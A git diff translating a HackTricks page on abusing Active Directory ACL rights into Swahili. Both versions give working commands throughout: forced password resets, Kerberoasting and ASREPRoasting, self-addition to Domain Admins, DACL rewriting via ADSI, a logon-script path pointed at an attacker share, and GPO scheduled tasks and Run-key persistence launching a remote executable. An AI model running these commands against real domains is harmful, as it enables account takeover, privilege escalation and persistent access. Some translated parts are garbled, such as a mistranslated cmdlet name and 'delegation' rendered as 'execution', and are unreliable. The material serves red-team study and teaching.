@@ -1,93 +1,79 @@
-# Abusing Active Directory ACLs/ACEs
+# Kudhuru Mifumo ya Active Directory ACLs/ACEs
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Njia nyingine za kusaidia HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.
+Pata udhaifu unaofaa zaidi ili uweze kuzirekebisha haraka. Intruder inafuatilia eneo lako la shambulio, inafanya uchunguzi wa vitisho wa kujitokeza, inapata masuala katika mfumo wako mzima wa teknolojia, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
 ***
 
+**Ukurasa huu kwa kiasi kikubwa ni muhtasari wa mbinu kutoka [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) na [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges). Kwa maelezo zaidi, angalia nakala asili.**
 
-**This page is mostly a summary of the techniques from [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) and [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges). For more details, check the original articles.**
 
+## **Haki za GenericAll kwenye Mtumiaji**
+Haki hii inampa mshambuliaji udhibiti kamili juu ya akaunti ya mtumiaji anayelengwa. Mara baada ya kuthibitisha haki za `GenericAll` kwa kutumia amri ya `Get-ObjectAcl`, mshambuliaji anaweza:
 
-## **GenericAll Rights on User**
-This privilege grants an attacker full control over a target user account. Once `GenericAll` rights are confirmed using the `Get-ObjectAcl` command, an attacker can:
-
-- **Change the Target's Password**: Using `net user <username> <password> /domain`, the attacker can reset the user's password.
-- **Targeted Kerberoasting**: Assign an SPN to the user's account to make it kerberoastable, then use Rubeus and targetedKerberoast.py to extract and attempt to crack the ticket-granting ticket (TGT) hashes.
-
+- **Kubadilisha Nenosiri la Lengo**: Kwa kutumia `net user <jina la mtumiaji> <nenosiri> /domain`, mshambuliaji anaweza kurejesha upya nenosiri la mtumiaji.
+- **Kerberoasting Inayolengwa**: Weka SPN kwenye akaunti ya mtumiaji ili iweze kufanyiwa kerberoasting, kisha tumia Rubeus na targetedKerberoast.py kuchukua na kujaribu kuvunja funguo za tiketi ya kutoa ruhusa (TGT).
 ```powershell
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
 .\Rubeus.exe kerberoast /user:<username> /nowrap
 Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 ```
-
-- **Targeted ASREPRoasting**: Disable pre-authentication for the user, making their account vulnerable to ASREPRoasting.
-
+- **Kulenga ASREPRoasting**: Lemaza uthibitishaji kabla ya kuthibitisha kwa mtumiaji, kufanya akaunti yao kuwa hatarini kwa ASREPRoasting.
 ```powershell
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
+## **Haki za GenericAll kwenye Kikundi**
+Haki hii inaruhusu mshambuliaji kubadilisha uanachama wa kikundi ikiwa ana haki za `GenericAll` kwenye kikundi kama `Domain Admins`. Baada ya kutambua jina la kipekee la kikundi kwa kutumia `Get-NetGroup`, mshambuliaji anaweza:
 
-## **GenericAll Rights on Group**
-This privilege allows an attacker to manipulate group memberships if they have `GenericAll` rights on a group like `Domain Admins`. After identifying the group's distinguished name with `Get-NetGroup`, the attacker can:
-
-- **Add Themselves to the Domain Admins Group**: This can be done via direct commands or using modules like Active Directory or PowerSploit.
-
+- **Kujiweka kwenye Kikundi cha Domain Admins**: Hii inaweza kufanywa kupitia amri moja kwa moja au kwa kutumia moduli kama Active Directory au PowerSploit.
 ```powershell
 net group "domain admins" spotless /add /domain
 Add-ADGroupMember -Identity "domain admins" -Members spotless
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
 ```
+## **GenericAll / GenericWrite / Andika kwenye Kompyuta/Mtumiaji**
+Kumiliki mamlaka haya kwenye kifaa cha kompyuta au akaunti ya mtumiaji inaruhusu:
 
-## **GenericAll / GenericWrite / Write on Computer/User**
-Holding these privileges on a computer object or a user account allows for:
+- **Kerberos Resource-based Constrained Delegation**: Inawezesha kuchukua udhibiti wa kifaa cha kompyuta.
+- **Shadow Credentials**: Tumia mbinu hii kuiga kifaa cha kompyuta au akaunti ya mtumiaji kwa kuchexploit mamlaka ya kuunda shadow credentials.
 
-- **Kerberos Resource-based Constrained Delegation**: Enables taking over a computer object.
-- **Shadow Credentials**: Use this technique to impersonate a computer or user account by exploiting the privileges to create shadow credentials.
+## **Andika Mali kwenye Kikundi**
+Ikiwa mtumiaji ana haki za `Andika Mali` kwenye vitu vyote kwa kikundi maalum (kwa mfano, `Domain Admins`), wanaweza:
 
-## **WriteProperty on Group**
-If a user has `WriteProperty` rights on all objects for a specific group (e.g., `Domain Admins`), they can:
-
-- **Add Themselves to the Domain Admins Group**: Achievable via combining `net user` and `Add-NetGroupUser` commands, this method allows privilege escalation within the domain.
-
+- **Kujiweka kwenye Kikundi cha Domain Admins**: Inawezekana kwa kuchanganya amri za `net user` na `Add-NetGroupUser`, mbinu hii inaruhusu kuongeza mamlaka ndani ya kikoa.
 ```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
-
-## **Self (Self-Membership) on Group**
-This privilege enables attackers to add themselves to specific groups, such as `Domain Admins`, through commands that manipulate group membership directly. Using the following command sequence allows for self-addition:
-
+## **Self (Uanachama wa Mwenyewe) kwenye Kikundi**
+Haki hii inawezesha wadukuzi kujiweka wenyewe kwenye vikundi maalum, kama vile `Domain Admins`, kupitia amri ambazo zinabadilisha uanachama wa kikundi moja kwa moja. Kutumia mfuatano wa amri zifuatazo inaruhusu kujiweka wenyewe:
 ```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
-
-## **WriteProperty (Self-Membership)**
-A similar privilege, this allows attackers to directly add themselves to groups by modifying group properties if they have the `WriteProperty` right on those groups. The confirmation and execution of this privilege are performed with:
-
+## **WriteProperty (Uanachama wa Kujisajili)**
+Haki kama hii inaruhusu wadukuzi kujiweka wenyewe moja kwa moja kwenye makundi kwa kubadilisha mali za kundi ikiwa wana haki ya `WriteProperty` kwenye makundi hayo. Uthibitisho na utekelezaji wa haki hii unafanywa kwa kutumia:
 ```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 net group "domain admins" spotless /add /domain
 ```
-
 ## **ForceChangePassword**
-Holding the `ExtendedRight` on a user for `User-Force-Change-Password` allows password resets without knowing the current password. Verification of this right and its exploitation can be done through PowerShell or alternative command-line tools, offering several methods to reset a user's password, including interactive sessions and one-liners for non-interactive environments. The commands range from simple PowerShell invocations to using `rpcclient` on Linux, demonstrating the versatility of attack vectors.
-
+Kushikilia `ExtendedRight` kwa mtumiaji kwa `User-Force-Change-Password` inaruhusu kurekebisha nywila bila kujua nywila ya sasa. Uhakiki wa haki hii na utumiaji wake unaweza kufanywa kupitia PowerShell au zana za amri mbadala, zinazotoa njia kadhaa za kurekebisha nywila ya mtumiaji, ikiwa ni pamoja na vikao vya mwingiliano na mistari moja kwa mazingira yasiyo ya mwingiliano. Amri hizo zinatofautiana kutoka kwa wito rahisi wa PowerShell hadi kutumia `rpcclient` kwenye Linux, zikionyesha uwezo wa njia za mashambulizi.
 ```powershell
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainUserPassword -Identity delegate -Verbose
@@ -98,26 +84,20 @@ Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureStri
 rpcclient -U KnownUsername 10.10.10.192
 > setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
 ```
-
-## **WriteOwner on Group**
-If an attacker finds that they have `WriteOwner` rights over a group, they can change the ownership of the group to themselves. This is particularly impactful when the group in question is `Domain Admins`, as changing ownership allows for broader control over group attributes and membership. The process involves identifying the correct object via `Get-ObjectAcl` and then using `Set-DomainObjectOwner` to modify the owner, either by SID or name.
-
+## **AndikaMmiliki kwenye Kikundi**
+Ikiwa mshambuliaji anagundua kuwa ana haki za `AndikaMmiliki` juu ya kikundi, wanaweza kubadilisha umiliki wa kikundi kuwa wao wenyewe. Hii ina athari kubwa hasa wakati kikundi kinachohusika ni `Domain Admins`, kwani kubadilisha umiliki kunaruhusu udhibiti mpana juu ya sifa za kikundi na uanachama. Mchakato huu unahusisha kutambua kitu sahihi kupitia `Pata-KituAcl` na kisha kutumia `Set-DomainObjectOwner` kubadilisha mmiliki, kwa kutumia SID au jina.
 ```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
 Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
-
-## **GenericWrite on User**
-This permission allows an attacker to modify user properties. Specifically, with `GenericWrite` access, the attacker can change the logon script path of a user to execute a malicious script upon user logon. This is achieved by using the `Set-ADObject` command to update the `scriptpath` property of the target user to point to the attacker's script.
-
+## **GenericWrite kwa Mtumiaji**
+Ruhusa hii inamruhusu mshambuliaji kubadilisha mali za mtumiaji. Kwa usahihi, kwa kupata ufikiaji wa `GenericWrite`, mshambuliaji anaweza kubadilisha njia ya hati ya kuingia ya mtumiaji ili kutekeleza hati ya kudhuru wakati mtumiaji anapoingia. Hii inafanikiwa kwa kutumia amri ya `Set-ADObject` kusasisha mali ya `scriptpath` ya mtumiaji lengwa ili ionyeshe hati ya mshambuliaji.
 ```powershell
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
-
-## **GenericWrite on Group**
-With this privilege, attackers can manipulate group membership, such as adding themselves or other users to specific groups. This process involves creating a credential object, using it to add or remove users from a group, and verifying the membership changes with PowerShell commands.
-
+## **GenericWrite kwenye Kikundi**
+Kwa haki hii, wadukuzi wanaweza kubadilisha uanachama wa kikundi, kama vile kuongeza wao wenyewe au watumiaji wengine kwenye vikundi maalum. Mchakato huu unahusisha kuunda kitambulisho, kutumia kitambulisho hicho kuongeza au kuondoa watumiaji kutoka kikundi, na kuthibitisha mabadiliko ya uanachama kwa kutumia amri za PowerShell.
 ```powershell
 $pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
@@ -125,10 +105,8 @@ Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'userna
 Get-DomainGroupMember -Identity "Group Name" | Select MemberName
 Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
 ```
-
 ## **WriteDACL + WriteOwner**
-Owning an AD object and having `WriteDACL` privileges on it enables an attacker to grant themselves `GenericAll` privileges over the object. This is accomplished through ADSI manipulation, allowing for full control over the object and the ability to modify its group memberships. Despite this, limitations exist when trying to exploit these privileges using the Active Directory module's `Set-Acl` / `Get-Acl` cmdlets.
-
+Umiliki kitu cha AD na kuwa na mamlaka ya `WriteDACL` kunawezesha mshambuliaji kujipatia mamlaka ya `GenericAll` juu ya kitu hicho. Hii inafanikishwa kupitia udanganyifu wa ADSI, kuruhusu udhibiti kamili juu ya kitu na uwezo wa kubadilisha uanachama wake wa kikundi. Licha ya hilo, kuna vikwazo vinavyojitokeza wakati wa kudukua mamlaka haya kwa kutumia moduli ya Active Directory's `Set-Acl` / `Get-Acl` cmdlets.
 ```powershell
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -136,88 +114,79 @@ $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityRe
 $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
 ```
-
-## **Replication on the Domain (DCSync)**
-The DCSync attack leverages specific replication permissions on the domain to mimic a Domain Controller and synchronize data, including user credentials. This powerful technique requires permissions like `DS-Replication-Get-Changes`, allowing attackers to extract sensitive information from the AD environment without direct access to a Domain Controller.
-[**Learn more about the DCSync attack here.**](../dcsync.md)
-
+## **Replikesheni kwenye Kikoa (DCSync)**
+Shambulio la DCSync linatumia ruhusa maalum za replikesheni kwenye kikoa ili kuiga Kudhibiti Kikoa na kusawazisha data, ikiwa ni pamoja na sifa za watumiaji. Tekniki hii yenye nguvu inahitaji ruhusa kama vile `DS-Replication-Get-Changes`, kuruhusu wadukuzi kuchukua habari nyeti kutoka kwenye mazingira ya AD bila kupata moja kwa moja kwenye Kudhibiti Kikoa.
+[**Jifunze zaidi kuhusu shambulio la DCSync hapa.**](../dcsync.md)
 
 
 
 
 
 
-## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>
 
-### GPO Delegation
+## Utekelezaji wa GPO <a href="#gpo-delegation" id="gpo-delegation"></a>
 
-Delegated access to manage Group Policy Objects (GPOs) can present significant security risks. For instance, if a user such as `offense\spotless` is delegated GPO management rights, they may have privileges like **WriteProperty**, **WriteDacl**, and **WriteOwner**. These permissions can be abused for malicious purposes, as identified using PowerView:
-    ```bash
-    Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
-    ```
+### Utekelezaji wa GPO
 
-### Enumerate GPO Permissions
+Upatikanaji uliopewa ruhusa ya kusimamia Vitu vya Sera ya Kikundi (GPOs) unaweza kuwa na hatari kubwa ya usalama. Kwa mfano, ikiwa mtumiaji kama vile `offense\spotless` amepewa haki za usimamizi wa GPO, wanaweza kuwa na mamlaka kama vile **WriteProperty**, **WriteDacl**, na **WriteOwner**. Ruhusa hizi zinaweza kutumiwa vibaya kwa madhumuni mabaya, kama ilivyobainishwa kwa kutumia PowerView:
+```bash
+Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
+```
 
-To identify misconfigured GPOs, PowerSploit's cmdlets can be chained together. This allows for the discovery of GPOs that a specific user has permissions to manage:
-    ```powershell
-    Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
-    ```
+### Kuchunguza Ruhusa za GPO
 
-**Computers with a Given Policy Applied**: It's possible to resolve which computers a specific GPO applies to, helping understand the scope of potential impact.
-    ```powershell
-    Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
-    ```
+Kutambua GPOs zilizokosewa, amri za PowerSploit zinaweza kuunganishwa pamoja. Hii inaruhusu ugunduzi wa GPOs ambazo mtumiaji maalum ana ruhusa za kusimamia:
+```powershell
+Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
+```
 
-**Policies Applied to a Given Computer**: To see what policies are applied to a particular computer, commands like `Get-DomainGPO` can be utilized.
+**Kompyuta Zilizo na Sera Iliyotekelezwa Iliyopewa**: Inawezekana kutambua ni kompyuta zipi zinazotumia GPO fulani, kusaidia kuelewa wigo wa athari inayowezekana.
+```powershell
+Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
+```
 
-**OUs with a Given Policy Applied**: Identifying organizational units (OUs) affected by a given policy can be done using `Get-DomainOU`.
+**Sera Iliyotekelezwa kwenye Kompyuta Iliyopewa**: Ili kuona sera zipi zilizotekelezwa kwenye kompyuta fulani, amri kama vile `Get-DomainGPO` zinaweza kutumika.
 
-### Abuse GPO - New-GPOImmediateTask
+**OU Zilizoathiriwa na Sera Iliyotekelezwa Iliyopewa**: Kutambua vitengo vya shirika (OUs) vilivyoathiriwa na sera iliyopewa inaweza kufanywa kwa kutumia `Get-DomainOU`.
 
-Misconfigured GPOs can be exploited to execute code, for example, by creating an immediate scheduled task. This can be done to add a user to the local administrators group on affected machines, significantly elevating privileges:
+### Matumizi Mabaya ya GPO - New-GPOImmediateTask
 
+GPOs zilizokosewa zinaweza kutumiwa kutekeleza nambari, kwa mfano, kwa kuunda kazi ya ratiba ya moja kwa moja. Hii inaweza kufanywa ili kuongeza mtumiaji kwenye kikundi cha wasimamizi wa ndani kwenye mashine zilizoathiriwa, kuinua sana mamlaka:
 ```powershell
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
+### Kikundi cha Moduli - Matumizi mabaya ya GPO
 
-### GroupPolicy module - Abuse GPO
-
-The GroupPolicy module, if installed, allows for the creation and linking of new GPOs, and setting preferences such as registry values to execute backdoors on affected computers. This method requires the GPO to be updated and a user to log in to the computer for execution:
-
+Kikundi cha Moduli, ikiwa imewekwa, inaruhusu uundaji na uunganishaji wa GPO mpya, na kuweka mapendeleo kama vile thamani za usajili ili kutekeleza milango ya nyuma kwenye kompyuta zilizoathiriwa. Njia hii inahitaji GPO kusasishwa na mtumiaji kuingia kwenye kompyuta ili kutekelezwa:
 ```powershell
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
 ```
+### SharpGPOAbuse - Matumizi Mabaya ya GPO
 
-### SharpGPOAbuse - Abuse GPO
-
-SharpGPOAbuse offers a method to abuse existing GPOs by adding tasks or modifying settings without the need to create new GPOs. This tool requires modification of existing GPOs or using RSAT tools to create new ones before applying changes:
-
+SharpGPOAbuse inatoa njia ya kutumia vibaya GPO zilizopo kwa kuongeza kazi au kubadilisha mipangilio bila haja ya kuunda GPO mpya. Zana hii inahitaji kufanyia marekebisho GPO zilizopo au kutumia zana za RSAT kuunda GPO mpya kabla ya kufanya mabadiliko:
 ```bash
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
 ```
+### Kulazimisha Sasisho la Sera
 
-### Force Policy Update
+Kawaida, sasisho za GPO hufanyika kila baada ya dakika 90. Ili kuharakisha mchakato huu, hasa baada ya kutekeleza mabadiliko, amri ya `gpupdate /force` inaweza kutumika kwenye kompyuta lengwa ili kulazimisha sasisho la sera mara moja. Amri hii inahakikisha kuwa mabadiliko yoyote kwenye GPO yanatekelezwa bila kusubiri mzunguko wa sasisho la kiotomatiki ujao.
 
-GPO updates typically occur around every 90 minutes. To expedite this process, especially after implementing a change, the `gpupdate /force` command can be used on the target computer to force an immediate policy update. This command ensures that any modifications to GPOs are applied without waiting for the next automatic update cycle.
+### Chini ya Kapu
 
-### Under the Hood
+Kwa kuchunguza Kazi Zilizopangwa kwa GPO fulani, kama vile `Misconfigured Policy`, kuongezwa kwa kazi kama vile `evilTask` kunaweza kuthibitishwa. Kazi hizi hujengwa kupitia hati au zana za mstari wa amri zinazolenga kubadilisha tabia ya mfumo au kuongeza mamlaka.
 
-Upon inspection of the Scheduled Tasks for a given GPO, like the `Misconfigured Policy`, the addition of tasks such as `evilTask` can be confirmed. These tasks are created through scripts or command-line tools aiming to modify system behavior or escalate privileges.
+Muundo wa kazi, kama inavyoonyeshwa kwenye faili ya usanidi ya XML iliyozalishwa na `New-GPOImmediateTask`, unafafanua maelezo ya kazi iliyopangwa - ikiwa ni pamoja na amri itakayotekelezwa na vichocheo vyake. Faili hii inawakilisha jinsi kazi zilizopangwa zinavyofafanuliwa na kusimamiwa ndani ya GPO, ikitoa njia ya kutekeleza amri au hati za aina yoyote kama sehemu ya utekelezaji wa sera.
 
-The structure of the task, as shown in the XML configuration file generated by `New-GPOImmediateTask`, outlines the specifics of the scheduled task - including the command to be executed and its triggers. This file represents how scheduled tasks are defined and managed within GPOs, providing a method for executing arbitrary commands or scripts as part of policy enforcement.
+### Watumiaji na Vikundi
 
-### Users and Groups
+GPO pia inaruhusu uhariri wa watumiaji na uanachama wa vikundi kwenye mifumo lengwa. Kwa kuhariri faili za sera za Watumiaji na Vikundi moja kwa moja, wadukuzi wanaweza kuongeza watumiaji kwenye vikundi vyenye mamlaka, kama vile kikundi cha `administrators` cha ndani. Hii inawezekana kupitia uteuzi wa ruhusa za usimamizi wa GPO, ambayo inaruhusu mabadiliko ya faili za sera ili kuongeza watumiaji wapya au kubadilisha uanachama wa vikundi.
 
-GPOs also allow for the manipulation of user and group memberships on target systems. By editing the Users and Groups policy files directly, attackers can add users to privileged groups, such as the local `administrators` group. This is possible through the delegation of GPO management permissions, which permits the modification of policy files to include new users or change group memberships.
+Faili ya usanidi ya XML kwa Watumiaji na Vikundi inaelezea jinsi mabadiliko haya yanatekelezwa. Kwa kuongeza vitu kwenye faili hii, watumiaji maalum wanaweza kupewa mamlaka ya juu kwenye mifumo iliyohusika. Njia hii inatoa njia moja kwa moja ya kuongeza mamlaka kupitia uhariri wa GPO.
 
-The XML configuration file for Users and Groups outlines how these changes are implemented. By adding entries to this file, specific users can be granted elevated privileges across affected systems. This method offers a direct approach to privilege escalation through GPO manipulation.
+Zaidi ya hayo, njia zaidi za kutekeleza nambari au kudumisha uthabiti, kama vile kutumia hati za kuingia/kutoka, kuhariri funguo za usajili kwa ajili ya kuanza moja kwa moja, kusakinisha programu kupitia faili za .msi, au kuhariri mipangilio ya huduma, pia zinaweza kuzingatiwa. Tekniki hizi zinatoa njia mbalimbali za kudumisha ufikiaji na kudhibiti mifumo lengwa kupitia unyanyasaji wa GPO.
 
-Furthermore, additional methods for executing code or maintaining persistence, such as leveraging logon/logoff scripts, modifying registry keys for autoruns, installing software via .msi files, or editing service configurations, can also be considered. These techniques provide various avenues for maintaining access and controlling target systems through the abuse of GPOs.
-
-
-
-## References
+## Marejeo
 
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
 * [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
@@ -229,21 +198,21 @@ Furthermore, additional methods for executing code or maintaining persistence, s
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.
+Tafuta udhaifu unaofaa zaidi ili uweze kuyatatua haraka. Intruder inafuatilia eneo lako la shambulio, inatekeleza uchunguzi wa vitisho wa kujitahidi, inapata masuala katika mfumo wako mzima wa teknolojia, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Njia nyingine za kusaidia HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
